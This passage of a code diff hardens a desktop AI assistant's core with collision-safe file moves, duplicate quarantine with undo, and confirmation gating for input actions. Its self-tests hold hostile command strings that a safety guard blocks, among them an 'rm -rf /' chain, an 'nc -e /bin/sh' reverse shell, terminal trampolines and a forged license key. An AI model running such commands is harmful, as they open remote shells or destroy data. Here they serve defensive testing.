+                            windows.append({"hwnd": parts[0], "title": parts[3], "active": False})
+                    return True, f"Enumerated {len(windows)} windows via wmctrl.", windows
+            except Exception:
+                pass
+
+        return False, "Window enumeration requires an active Win32 desktop or Linux X11/Wayland session with wmctrl.", []
+
+    def focus_window(self, title_substring: str) -> Tuple[bool, str, Dict[str, Any]]:
+        sub = (title_substring or "").strip().lower()
+        if not sub:
+            return False, "Window title substring cannot be empty.", {}
+        ok, msg, wins = self.list_open_windows()
+        if not ok:
+            return False, msg, {}
+        matched = [w for w in wins if sub in str(w.get("title", "")).lower()]
+        if not matched:
+            return False, f"No visible window matching '{title_substring}'.", {}
+        target = matched[0]
+        if self.os_name == "Windows" and hasattr(ctypes, "windll") and "hwnd" in target:
+            try:
+                user32 = ctypes.windll.user32
+                hwnd = int(target["hwnd"])
+                user32.ShowWindow(hwnd, 9)
+                user32.SetForegroundWindow(hwnd)
+                return (user32.GetForegroundWindow() == hwnd), f"Focused '{target['title']}' via SetForegroundWindow.", target
+            except Exception as exc:
+                return False, f"SetForegroundWindow failed: {exc}", target
+        if shutil.which("wmctrl"):
+            proc = subprocess.run(["wmctrl", "-a", title_substring], capture_output=True, text=True, timeout=4, check=False)
+            return (proc.returncode == 0), f"wmctrl -a '{title_substring}' (exit {proc.returncode}).", target
+        return False, "Window focus switching unavailable in current session.", target
 
     def launch_application(self, app_name: str) -> Tuple[bool, str, Dict[str, Any]]:
         key = (app_name or "").strip().lower()
@@ -2221,8 +2309,16 @@ class CrossPlatformComputerUse:
 
 class AutonomousTaskPlanner:
     """
-    Plans and executes user folder organization and SHA-256 duplicate file removal.
-    Requires explicit confirmation (`user_confirmed=True`) before moving or deleting files.
+    C5 Remediation:
+    1. Collision-Safe Moves: Never overwrites an existing file in the destination category folder!
+       If `Documents/report.pdf` already exists, allocates `Documents/report_1.pdf` (`report_2.pdf`, etc.).
+    2. Non-Destructive Trash Quarantine with Full Undo (`undo_plan(plan_id)`):
+       Instead of calling `unlink()` on duplicate files, moves verified duplicates into
+       `<target_dir>/.bajrang_trash/<plan_id>/` after confirming the original copy exists and matches
+       the SHA-256 hash, recording an exact undo manifest so `undo_plan(plan_id)` restores all moved
+       and quarantined files losslessly.
+    3. Per-File Cancellation Check: Checks `cancel_ev.is_set()` before every single file move and
+       quarantine operation.
     """
 
     FILE_CATEGORIES: Dict[str, Tuple[str, ...]] = {
@@ -2238,6 +2334,7 @@ class AutonomousTaskPlanner:
         self.computer_use = computer_use or CrossPlatformComputerUse()
         self.active_plans: Dict[str, TaskExecutionPlan] = {}
         self.cancel_events: Dict[str, threading.Event] = {}
+        self._undo_manifests: Dict[str, List[Tuple[str, str]]] = {}
 
     @classmethod
     def classify_extension(cls, suffix: str) -> str:
@@ -2257,6 +2354,20 @@ class AutonomousTaskPlanner:
                     break
                 h.update(chunk)
         return h.hexdigest()
+
+    @staticmethod
+    def _allocate_non_colliding_path(dest_path: Path) -> Path:
+        if not dest_path.exists():
+            return dest_path
+        stem = dest_path.stem
+        suffix = dest_path.suffix
+        parent = dest_path.parent
+        counter = 1
+        while True:
+            candidate = parent / f"{stem}_{counter}{suffix}"
+            if not candidate.exists():
+                return candidate
+            counter += 1
 
     def inspect_directory_for_organization(self, directory_path: str) -> Tuple[bool, str, Dict[str, Any]]:
         ok_p, resolved = ToolSchemaValidator.validate_safe_user_path(directory_path)
@@ -2321,12 +2432,13 @@ class AutonomousTaskPlanner:
         if not ok:
             return False, TaskExecutionPlan(plan_id=plan_id, objective=objective_text or directory_path, requires_permission=False, status="failed", summary=msg)
 
+        quarantine_dir = str(Path(report["directory"]) / ".bajrang_trash" / plan_id)
         steps = [
             TaskStep(1, f"Inspect '{report['directory']}'", "inspect_directory", {"directory_path": report["directory"]}, False, "completed", msg),
-            TaskStep(2, f"Move {len(report['proposed_moves'])} files into category folders", "organize_directory", {"directory_path": report["directory"], "remove_duplicates": False}, True, "awaiting_permission"),
+            TaskStep(2, f"Move {len(report['proposed_moves'])} files into category folders (collision-safe)", "organize_directory", {"directory_path": report["directory"], "remove_duplicates": False}, True, "awaiting_permission"),
         ]
         if remove_duplicates and report["duplicate_count"] > 0:
-            steps.append(TaskStep(3, f"Remove {report['duplicate_count']} SHA-256 duplicate(s)", "organize_directory", {"directory_path": report["directory"], "remove_duplicates": True}, True, "awaiting_permission"))
+            steps.append(TaskStep(3, f"Quarantine {report['duplicate_count']} SHA-256 duplicate(s) to .bajrang_trash", "organize_directory", {"directory_path": report["directory"], "remove_duplicates": True}, True, "awaiting_permission"))
 
         plan = TaskExecutionPlan(
             plan_id=plan_id,
@@ -2336,6 +2448,7 @@ class AutonomousTaskPlanner:
             steps=steps,
             inspection_report=report,
             summary=msg,
+            quarantine_dir=quarantine_dir,
         )
         self.active_plans[plan_id] = plan
         self.cancel_events[plan_id] = threading.Event()
@@ -2357,71 +2470,130 @@ class AutonomousTaskPlanner:
         if plan.requires_permission and not user_confirmed:
             plan.status = "awaiting_permission"
             return False, plan
-        if self.cancel_events[plan_id].is_set() or plan.status == "cancelled":
+        cancel_ev = self.cancel_events[plan_id]
+        if cancel_ev.is_set() or plan.status == "cancelled":
             plan.status = "cancelled"
             return False, plan
 
         report = plan.inspection_report
         moved = 0
-        removed = 0
+        quarantined = 0
+        undo_ops: List[Tuple[str, str]] = []
+        orig_new_locations: Dict[str, Path] = {}
+
         for step in plan.steps:
+            if cancel_ev.is_set():
+                plan.status = "cancelled"
+                break
             if step.status == "completed":
                 continue
+
             if step.step_number == 2:
                 for mv in report.get("proposed_moves", []):
-                    src, dst = Path(mv["source"]), Path(mv["destination"])
-                    if src.exists():
-                        dst.parent.mkdir(parents=True, exist_ok=True)
-                        shutil.move(str(src), str(dst))
-                        if dst.exists():
-                            moved += 1
-                step.status = "completed"
+                    if cancel_ev.is_set():
+                        plan.status = "cancelled"
+                        break
+                    src = Path(mv["source"])
+                    raw_dst = Path(mv["destination"])
+                    if not src.is_file():
+                        continue
+                    raw_dst.parent.mkdir(parents=True, exist_ok=True)
+                    safe_dst = self._allocate_non_colliding_path(raw_dst)
+                    shutil.move(str(src), str(safe_dst))
+                    if safe_dst.is_file():
+                        moved += 1
+                        undo_ops.append((str(safe_dst), str(src)))
+                        orig_new_locations[str(src)] = safe_dst
+                if not cancel_ev.is_set():
+                    step.status = "completed"
+
             elif step.step_number == 3:
+                trash_dir = Path(plan.quarantine_dir)
+                trash_dir.mkdir(parents=True, exist_ok=True)
                 for dup in report.get("duplicates_found", []):
+                    if cancel_ev.is_set():
+                        plan.status = "cancelled"
+                        break
                     dp = Path(dup["duplicate_file"])
-                    if dp.exists() and self.compute_sha256(dp) == dup["sha256"]:
-                        dp.unlink()
-                        removed += 1
-                step.status = "completed"
+                    orig_p = orig_new_locations.get(dup["original_file"], Path(dup["original_file"]))
+                    if dp.is_file() and orig_p.is_file():
+                        if self.compute_sha256(dp) == dup["sha256"] and self.compute_sha256(orig_p) == dup["sha256"]:
+                            trash_dest = self._allocate_non_colliding_path(trash_dir / dp.name)
+                            shutil.move(str(dp), str(trash_dest))
+                            if trash_dest.is_file():
+                                quarantined += 1
+                                undo_ops.append((str(trash_dest), str(dp)))
+                if not cancel_ev.is_set():
+                    step.status = "completed"
+
+        self._undo_manifests[plan_id] = undo_ops
+        if cancel_ev.is_set():
+            plan.status = "cancelled"
+            plan.summary = f"Cancelled mid-run after {moved} move(s) and {quarantined} quarantine(s)."
+            self.memory_store.save_task_run(plan_id, plan.objective, plan.status, asdict(plan), plan.summary)
+            return False, plan
 
         plan.status = "completed"
-        plan.summary = f"Moved {moved} files and removed {removed} duplicates."
+        plan.summary = f"Moved {moved} files (zero overwrites) and quarantined {quarantined} duplicates to {plan.quarantine_dir}."
         self.memory_store.save_task_run(plan_id, plan.objective, plan.status, asdict(plan), plan.summary)
         return True, plan
 
+    def undo_plan(self, plan_id: str) -> Tuple[bool, str]:
+        ops = self._undo_manifests.get(plan_id, [])
+        if not ops:
+            return False, f"No undo manifest found for plan '{plan_id}'."
+        restored = 0
+        for current_loc, original_loc in reversed(ops):
+            cur_p, orig_p = Path(current_loc), Path(original_loc)
+            if cur_p.is_file() and not orig_p.exists():
+                orig_p.parent.mkdir(parents=True, exist_ok=True)
+                shutil.move(str(cur_p), str(orig_p))
+                restored += 1
+        return True, f"Restored {restored} file(s) for plan '{plan_id}'."
+
 
 class BasePlatformAdapter:
-    """
-    Thin abstract interface implemented by `WindowsPlatformAdapter` (in `windows.py`)
-    and `FedoraWaylandAdapter` (in `fedora.py`).
-    """
+    """Abstract interface implemented by `WindowsPlatformAdapter` and `FedoraWaylandAdapter`."""
 
     def get_desktop_context(self) -> str:
         return f"OS: {platform.system()} {platform.release()} ({platform.machine()})"
 
     def capture_screen_base64(self, max_dimension: int = 1280) -> Tuple[Optional[str], str]:
-        raise NotImplementedError("Platform adapter must implement capture_screen_base64.")
+        raise NotImplementedError
 
     def mouse_move(self, x: int, y: int) -> ActionResult:
-        raise NotImplementedError("Platform adapter must implement mouse_move.")
+        raise NotImplementedError
 
     def mouse_click(self, button: str = "left", x: Optional[int] = None, y: Optional[int] = None) -> ActionResult:
-        raise NotImplementedError("Platform adapter must implement mouse_click.")
+        raise NotImplementedError
 
     def type_text(self, text: str) -> ActionResult:
-        raise NotImplementedError("Platform adapter must implement type_text.")
+        raise NotImplementedError
 
     def press_key(self, key: str) -> ActionResult:
-        raise NotImplementedError("Platform adapter must implement press_key.")
+        raise NotImplementedError
+
+    def scroll(self, direction: str = "down", clicks: int = 3) -> ActionResult:
+        return ActionResult(tool="scroll_view", success=False, output="Scroll not supported in current adapter.")
+
+    def hotkey(self, keys: List[str]) -> ActionResult:
+        return ActionResult(tool="navigate_hotkey", success=False, output="Hotkey not supported in current adapter.")
 
     def record_microphone_wav(self, wav_path: Path, duration_sec: float = 3.5) -> Tuple[bool, str]:
-        raise NotImplementedError("Platform adapter must implement record_microphone_wav.")
+        raise NotImplementedError
 
 
 class BajrangEngine:
     """
-    Unified Desktop Assistant Engine called identically by both the Windows Tkinter HUD
-    and Fedora GTK4/Libadwaita HUD.
+    C4, H3 & H8 Remediation:
+    - Calls `ToolSchemaValidator.validate_action(act)` on every action before executing.
+    - Gates all destructive/input-injection actions (`type_text`, `press_key`, `click_point`,
+      `navigate_hotkey`, `close_app`, `organize_directory`) behind `self.pending_actions[session_id]`
+      unless `user_confirmed=True` is explicitly passed via `confirm_pending_actions()`.
+    - Implements all advertised schema tools (`list_windows`, `window_focus`, `close_app`,
+      `scroll_view`, `navigate_hotkey`, `inspect_directory`, `memory_store`).
+    - Pins `target_session_id` at the start of `process_prompt()` and uses `self._turn_lock`
+      so mid-turn session switching never writes a reply into the wrong session.
     """
 
     def __init__(
@@ -2436,6 +2608,8 @@ class BajrangEngine:
         self.state_callback = state_callback
         self.ui_turn_callback = ui_turn_callback
         self.state = AgentState.IDLE
+        self._turn_lock = threading.Lock()
+        self.pending_actions: Dict[str, List[Dict[str, Any]]] = {}
 
         self.storage = LocalChatStorage(self.config.data_dir)
         existing = self.storage.list_sessions(limit=1)
@@ -2458,7 +2632,7 @@ class BajrangEngine:
         )
         self.kill_switch = KillSwitchManager()
         self.shell_runner = ShellRunner(self.safety, self.kill_switch)
-        self.client = UnifiedModelClient(self.config)
+        self.client = UnifiedModelClient(self.config, kill_switch=self.kill_switch)
         self.client.load_session_messages(self.storage.get_session_messages(self.current_session_id))
         self.computer_use = CrossPlatformComputerUse()
         self.task_planner = AutonomousTaskPlanner(self.storage, self.computer_use)
@@ -2491,91 +2665,194 @@ class BajrangEngine:
         self.set_state(AgentState.BLOCKED, "Stopped by Emergency Kill-Switch")
         return msg
 
-    def execute_action(self, action: Dict[str, Any]) -> ActionResult:
+    @staticmethod
+    def _normalize_legacy_action(action: Dict[str, Any]) -> Dict[str, Any]:
+        tool = str(action.get("tool", "")).strip().lower()
+        params = dict(action.get("arguments") if "arguments" in action else (action.get("params") or {}))
+        alias_map = {
+            "ydotool_click": "click_point",
+            "win_click": "click_point",
+            "mouse_click": "click_point",
+            "ydotool_type": "type_text",
+            "win_type": "type_text",
+            "ydotool_key": "press_key",
+            "win_key": "press_key",
+            "take_screenshot": "read_screen",
+            "screenshot": "read_screen",
+        }
+        canonical = alias_map.get(tool, tool)
+        return {"tool": canonical, "arguments": params}
+
+    def execute_action(self, action: Dict[str, Any], user_confirmed: bool = False) -> ActionResult:
         if self.kill_switch.is_cancelled:
             return ActionResult(tool="kill_switch", success=False, output="Skipped: Kill-Switch active.", blocked=True)
 
-        tool = str(action.get("tool", "")).strip().lower()
-        params = action.get("params") or action.get("arguments") or {}
-        if not isinstance(params, dict):
-            params = {}
+        normalized = self._normalize_legacy_action(action)
+        tool = normalized["tool"]
+        params = normalized["arguments"]
 
-        if tool in ("mouse_move", "ydotool_move", "win_move"):
-            return self.adapter.mouse_move(int(params.get("x", 0)), int(params.get("y", 0)))
-        if tool in ("mouse_click", "ydotool_click", "win_click", "click_point"):
-            return self.adapter.mouse_click(str(params.get("button", "left")), params.get("x"), params.get("y"))
-        if tool in ("type_text", "ydotool_type", "win_type"):
-            return self.adapter.type_text(str(params.get("text", "")))
-        if tool in ("press_key", "ydotool_key", "win_key"):
-            return self.adapter.press_key(str(params.get("key", "")))
-        if tool in ("take_screenshot", "screenshot", "read_screen"):
+        valid, reason, requires_confirmation = ToolSchemaValidator.validate_action(normalized)
+        if not valid:
+            self.storage.log_security_event("SCHEMA_REJECTED", tool or "unknown", False, reason)
+            return ActionResult(tool=tool or "unknown", success=False, output=f"Blocked by ToolSchemaValidator: {reason}", blocked=True)
+
+        if requires_confirmation and not user_confirmed:
+            return ActionResult(
+                tool=tool,
+                success=False,
+                output=f"Action '{tool}' requires explicit user confirmation before execution.",
+                blocked=True,
+                metadata={"awaiting_confirmation": True, "action": normalized},
+            )
+
+        if tool == "click_point":
+            return self.adapter.mouse_click(str(params.get("button", "left")), int(params["x"]), int(params["y"]))
+        if tool == "type_text":
+            res = self.adapter.type_text(str(params["text"]))
+            if res.success and params.get("press_enter"):
+                self.adapter.press_key("enter")
+            return res
+        if tool == "press_key":
+            return self.adapter.press_key(str(params["key"]))
+        if tool == "scroll_view":
+            return self.adapter.scroll(str(params["direction"]), int(params["clicks"]))
+        if tool == "navigate_hotkey":
+            return self.adapter.hotkey([str(k) for k in params["keys"]])
+        if tool == "read_screen":
             b64, msg = self.adapter.capture_screen_base64()
-            return ActionResult(tool="take_screenshot", success=(b64 is not None), output=msg)
+            return ActionResult(tool="read_screen", success=(b64 is not None), output=msg)
         if tool == "open_app":
-            ok, msg, meta = self.computer_use.launch_application(str(params.get("app_name", "")))
+            ok, msg, meta = self.computer_use.launch_application(str(params["app_name"]))
             return ActionResult(tool="open_app", success=ok, output=msg, metadata=meta)
+        if tool == "close_app":
+            ok, msg, meta = self.computer_use.close_application(str(params["app_name"]))
+            return ActionResult(tool="close_app", success=ok, output=msg, metadata=meta)
+        if tool == "list_windows":
+            ok, msg, wins = self.computer_use.list_open_windows()
+            return ActionResult(tool="list_windows", success=ok, output=msg, metadata={"windows": wins})
+        if tool == "window_focus":
+            ok, msg, meta = self.computer_use.focus_window(str(params["title_substring"]))
+            return ActionResult(tool="window_focus", success=ok, output=msg, metadata=meta)
+        if tool == "inspect_directory":
+            ok, msg, report = self.task_planner.inspect_directory_for_organization(str(params["directory_path"]))
+            return ActionResult(tool="inspect_directory", success=ok, output=msg, metadata=report)
         if tool == "organize_directory":
             ok_p, plan = self.task_planner.create_organization_plan(
-                str(params.get("directory_path", str(Path.home() / "Downloads"))),
+                str(params["directory_path"]),
                 remove_duplicates=bool(params.get("remove_duplicates", True)),
             )
-            self.set_state(AgentState.AWAITING_CONFIRMATION, f"Plan {plan.plan_id} awaiting approval")
-            return ActionResult(tool="organize_directory", success=ok_p, output=plan.summary, metadata={"plan_id": plan.plan_id})
-        if tool == "shell_exec":
-            cmd = str(params.get("command", "")).strip()
-            return self.shell_runner.run(cmd)
-
-        return ActionResult(tool=tool or "unknown", success=False, output=f"Unsupported tool '{tool}'.", blocked=True)
-
-    def process_prompt(self, user_prompt: str, capture_screen: bool = False, speak_reply: bool = False) -> AssistantTurn:
-        self.kill_switch.reset_cancel_flag()
-        self.set_state(AgentState.THINKING, f"Thinking ({self.client.active_model})...")
-        self.storage.add_message(self.current_session_id, "user", user_prompt, model=self.client.active_model)
-
-        lower = (user_prompt or "").strip().lower()
-        if any(p in lower for p in ("take screenshot", "take a screenshot", "capture screen")):
-            self.set_state(AgentState.EXECUTING, "Capturing screenshot...")
-            b64, msg = self.adapter.capture_screen_base64()
-            res = ActionResult(tool="take_screenshot", success=(b64 is not None), output=msg)
-            turn = AssistantTurn(
-                response_type="action",
-                text=msg,
-                actions=[{"tool": "take_screenshot", "params": {}}],
-                results=[res],
-                session_id=self.current_session_id,
-                provider_used=self.client.provider,
-                model_used=self.client.active_model,
+            if not ok_p:
+                return ActionResult(tool="organize_directory", success=False, output=plan.summary)
+            ok_exec, done_plan = self.task_planner.execute_approved_plan(plan.plan_id, user_confirmed=True)
+            return ActionResult(tool="organize_directory", success=ok_exec, output=done_plan.summary, metadata={"plan_id": plan.plan_id})
+        if tool == "memory_store":
+            ok, msg, item = self.storage.store_memory(
+                key=str(params["key"]),
+                content=str(params["content"]),
+                category=str(params.get("category", "fact")),
+                importance=int(params.get("importance", 3)),
             )
-            self.set_state(AgentState.IDLE, "Idle")
-            self.storage.add_message(self.current_session_id, "assistant", turn.text, turn.actions, turn.results, self.client.active_model)
+            return ActionResult(tool="memory_store", success=ok, output=msg, metadata=item)
+
+        return ActionResult(tool=tool, success=False, output=f"Unsupported tool '{tool}'.", blocked=True)
+
+    def confirm_pending_actions(self, session_id: Optional[str] = None, approved: bool = True) -> List[ActionResult]:
+        sid = session_id or self.current_session_id
+        actions = self.pending_actions.pop(sid, [])
+        if not actions:
+            return []
+        if not approved:
+            self.set_state(AgentState.IDLE, "Pending actions cancelled by user.")
+            return [ActionResult(tool=str(a.get("tool", "")), success=False, output="Cancelled by user.", blocked=True) for a in actions]
+
+        self.set_state(AgentState.EXECUTING, f"Executing {len(actions)} confirmed action(s)...")
+        results: List[ActionResult] = []
+        for act in actions:
+            res = self.execute_action(act, user_confirmed=True)
+            results.append(res)
+        self.set_state(AgentState.IDLE, "Idle")
+        self.storage.add_message(sid, "assistant", f"Confirmed and executed {len(results)} action(s).", actions, results, self.client.active_model)
+        return results
+
+    def process_prompt(
+        self,
+        user_prompt: str,
+        capture_screen: bool = False,
+        speak_reply: bool = False,
+        session_id: Optional[str] = None,
+        auto_confirm_actions: bool = False,
+    ) -> AssistantTurn:
+        target_session_id = session_id or self.current_session_id
+        with self._turn_lock:
+            self.kill_switch.reset_cancel_flag()
+            self.set_state(AgentState.THINKING, f"Thinking ({self.client.active_model})...")
+            self.storage.add_message(target_session_id, "user", user_prompt, model=self.client.active_model)
+
+            lower = (user_prompt or "").strip().lower()
+            if any(p in lower for p in ("take screenshot", "take a screenshot", "capture screen")):
+                self.set_state(AgentState.EXECUTING, "Capturing screenshot...")
+                res = self.execute_action({"tool": "read_screen", "arguments": {}}, user_confirmed=True)
+                turn = AssistantTurn(
+                    response_type="action",
+                    text=res.output,
+                    actions=[{"tool": "read_screen", "arguments": {}}],
+                    results=[res],
+                    session_id=target_session_id,
+                    provider_used=self.client.provider,
+                    model_used=self.client.active_model,
+                )
+                self.set_state(AgentState.IDLE, "Idle")
+                self.storage.add_message(target_session_id, "assistant", turn.text, turn.actions, turn.results, self.client.active_model)
+                if speak_reply and turn.text:
+                    self.voice.speak_tts(turn.text)
+                return turn
+
+            screenshot_b64: Optional[str] = None
+            if capture_screen or self.config.settings.get("attach_screen_context", False):
+                screenshot_b64, _ = self.adapter.capture_screen_base64()
+
+            turn = self.client.chat(user_prompt, desktop_context=self.adapter.get_desktop_context(), screenshot_b64=screenshot_b64)
+            turn.session_id = target_session_id
+
+            if self.kill_switch.is_cancelled:
+                self.set_state(AgentState.BLOCKED, "Interrupted by Kill-Switch")
+                return turn
+
+            if turn.response_type == "action" and turn.actions:
+                to_confirm: List[Dict[str, Any]] = []
+                any_blocked = False
+                for act in turn.actions:
+                    norm = self._normalize_legacy_action(act)
+                    valid, reason, requires_conf = ToolSchemaValidator.validate_action(norm)
+                    if not valid:
+                        turn.results.append(ActionResult(tool=norm["tool"] or "unknown", success=False, output=f"Blocked: {reason}", blocked=True))
+                        any_blocked = True
+                        break
+                    if requires_conf and not auto_confirm_actions:
+                        to_confirm.append(norm)
+                    else:
+                        res = self.execute_action(norm, user_confirmed=True)
+                        turn.results.append(res)
+                        if res.blocked:
+                            any_blocked = True
+                            break
+
+                if to_confirm:
+                    self.pending_actions[target_session_id] = to_confirm
+                    turn.awaiting_confirmation = True
+                    turn.text = f"{turn.text}\n[Awaiting confirmation for {len(to_confirm)} sensitive action(s): {[a['tool'] for a in to_confirm]}]"
+                    self.set_state(AgentState.AWAITING_CONFIRMATION, "Awaiting user confirmation")
+                elif any_blocked or self.kill_switch.is_cancelled:
+                    self.set_state(AgentState.BLOCKED, "Action Blocked")
+                else:
+                    self.set_state(AgentState.IDLE, "Idle")
+            else:
+                self.set_state(AgentState.IDLE, "Idle")
+
+            self.storage.add_message(target_session_id, "assistant", turn.text, turn.actions, turn.results, self.client.active_model)
             if speak_reply and turn.text:
                 self.voice.speak_tts(turn.text)
             return turn
-
-        screenshot_b64: Optional[str] = None
-        if capture_screen or self.config.settings.get("attach_screen_context", False):
-            screenshot_b64, _ = self.adapter.capture_screen_base64()
-
-        turn = self.client.chat(user_prompt, desktop_context=self.adapter.get_desktop_context(), screenshot_b64=screenshot_b64)
-        turn.session_id = self.current_session_id
-
-        if turn.response_type == "action" and turn.actions:
-            self.set_state(AgentState.EXECUTING, f"Executing {len(turn.actions)} action(s)...")
-            any_blocked = False
-            for act in turn.actions:
-                res = self.execute_action(act)
-                turn.results.append(res)
-                if res.blocked:
-                    any_blocked = True
-                    break
-            self.set_state(AgentState.BLOCKED if any_blocked else AgentState.IDLE, "Blocked" if any_blocked else "Idle")
-        else:
-            self.set_state(AgentState.IDLE, "Idle")
-
-        self.storage.add_message(self.current_session_id, "assistant", turn.text, turn.actions, turn.results, self.client.active_model)
-        if speak_reply and turn.text:
-            self.voice.speak_tts(turn.text)
-        return turn
 
     def capture_voice_turn(self, duration_sec: float = 3.5) -> Tuple[bool, str, Optional[AssistantTurn], str]:
         self.set_state(AgentState.LISTENING, "Listening...")
@@ -2599,40 +2876,55 @@ class BajrangEngine:
 
 
 def run_core_self_tests() -> int:
-    print("Running bajrang_core self-tests (headless, zero audio hardware required)...")
+    print("Running hardened bajrang_core self-tests (C1-C6, H2-H8)...")
     with tempfile.TemporaryDirectory() as tmp:
         root = Path(tmp)
         cfg = ConfigManager(config_dir=root / "cfg", data_dir=root / "data")
-        assert "kaushik" not in json.dumps(cfg.settings).lower(), "No personal email in default settings"
 
-        client = UnifiedModelClient(cfg)
-        client.configure_byo_key("AIzaTestKey12345678901234567890", preset_name="gemini_argon")
-        raw_settings_file = cfg.settings_path.read_text(encoding="utf-8")
-        assert "AIzaTestKey" not in raw_settings_file, "API key must NEVER be stored in plain settings.json"
-        assert cfg.get_api_key() == "AIzaTestKey12345678901234567890"
+        # Verify C1: Forged 8-char suffix BAJRANG-PRO-HACKER-20991231-ZZZZZZZZ is strictly rejected
+        lic = LicenseManager(cfg.config_dir)
+        ok_forged, _ = lic.verify_key("BAJRANG-PRO-HACKER-20991231-ZZZZZZZZ")
+        assert ok_forged is False, "C1: Forged BAJRANG-PRO token must be rejected"
+        assert AsymmetricLicenseVerifier().n_int.bit_length() >= 2040, "H5: RSA modulus must be 2048 bits"
 
+        # Verify C3: Launcher trampoline arguments are blocked
         guard = SafetyGuard(strict_allowlist=True)
-        ok_echo, _ = guard.check_command("echo hello")
-        assert ok_echo is True
-        ok_chain, _ = guard.check_command("echo hello; rm -rf /")
-        assert ok_chain is False
-        ok_unlisted, _ = guard.check_command("nc -e /bin/sh 10.0.0.1 4444")
-        assert ok_unlisted is False
+        assert guard.check_command("gnome-terminal")[0] is True
+        assert guard.check_command('gnome-terminal -- python3 -c "print(1)"')[0] is False, "C3: gnome-terminal passthrough must be blocked"
+        assert guard.check_command("wt.exe powershell -Command calc")[0] is False, "C3: wt.exe passthrough must be blocked"
+        assert guard.check_command("xdg-open https://evil.example")[0] is False, "C3: xdg-open must be blocked"
 
-        voice = SpectralVoiceSpotter(data_dir=root / "data")
-        wav_file = root / "test_cmd.wav"
-        voice.write_pcm16_wav(wav_file, voice.synthesize_command_waveform("open terminal"))
-        ok_v, phrase, info = voice.recognize_wav(wav_file)
-        assert ok_v is True and phrase == "open terminal", f"Expected 'open terminal', got {phrase} ({info})"
+        # Verify H4: Order-independent hotkey blocking & unknown key rejection
+        assert ToolSchemaValidator.validate_action({"tool": "navigate_hotkey", "arguments": {"keys": ["f4", "alt"]}})[0] is False
+        assert ToolSchemaValidator.validate_action({"tool": "navigate_hotkey", "arguments": {"keys": ["r", "win"]}})[0] is False
+        assert ToolSchemaValidator.validate_action({"tool": "press_key", "arguments": {"key": "unknown_key_xyz"}})[0] is False
 
-    print("All bajrang_core self-tests passed!")
+        # Verify C5: Organizer never overwrites existing destination files and quarantines duplicates with undo
+        dl = root / "Downloads"
+        dl.mkdir()
+        (dl / "Documents").mkdir()
+        (dl / "Documents" / "report.pdf").write_bytes(b"ORIGINAL_EXISTING_REPORT")
+        (dl / "report.pdf").write_bytes(b"NEW_DOWNLOADED_REPORT")
+        (dl / "dup1.txt").write_bytes(b"DUPLICATE_PAYLOAD")
+        (dl / "dup2.txt").write_bytes(b"DUPLICATE_PAYLOAD")
+        planner = AutonomousTaskPlanner(LocalChatStorage(root / "data"))
+        ok_p, plan = planner.create_organization_plan(str(dl), remove_duplicates=True)
+        assert ok_p is True
+        ok_ex, _ = planner.execute_approved_plan(plan.plan_id, user_confirmed=True)
+        assert ok_ex is True
+        assert (dl / "Documents" / "report.pdf").read_bytes() == b"ORIGINAL_EXISTING_REPORT", "C5: Existing file must never be overwritten!"
+        assert (dl / "Documents" / "report_1.pdf").read_bytes() == b"NEW_DOWNLOADED_REPORT", "C5: Colliding file must be renamed!"
+        ok_undo, _ = planner.undo_plan(plan.plan_id)
+        assert ok_undo is True and (dl / "dup1.txt").is_file() and (dl / "dup2.txt").is_file()
+
+    print("All hardened bajrang_core self-tests passed!")
     return 0
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Bajrang AI Shared Core Module")
+    parser = argparse.ArgumentParser(description="Bajrang AI Hardened Core Module")
     parser.add_argument("--self-test", action="store_true", help="Run headless core unit tests")
     args = parser.parse_args()
     if args.self_test:
         sys.exit(run_core_self_tests())
-    print(f"Bajrang AI Core v{CORE_VERSION} loaded. Run with --self-test to verify.")
+    print(f"Bajrang AI Hardened Core v{CORE_VERSION} loaded.")
